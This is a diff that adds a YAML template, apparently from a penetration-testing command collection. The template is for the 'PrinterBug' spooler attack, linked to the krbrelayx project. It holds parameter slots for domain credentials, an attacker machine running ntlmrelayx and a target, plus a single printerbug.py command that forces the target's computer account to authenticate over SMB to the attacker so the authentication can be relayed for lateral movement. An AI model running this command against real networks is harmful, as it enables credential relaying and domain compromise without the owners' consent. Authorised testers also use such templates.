@@ -1,0 +1,21 @@
+---
+projectLink: https://github.com/dirkjanm/krbrelayx
+name: PrinterBug
+params:
+- name: Domain
+  description: Domain
+- name: Username
+  description: Low privileged User
+- name: Password
+  description: Password
+- name: AttackerMachine
+  description: Attacker machine with ntlmrelayx
+- name: Target
+  description: Target with spooler service
+
+sections:
+- name: Execute spooler exploit to trigger computer account smb authentication
+  labels: ["Lateral", "CVE", "Relaying"]
+  commands:
+  - language: PY
+    command: printerbug.py {{Domain}}/{{Username}}:{{Password}}@{{Target}} {{AttackerMachine}}
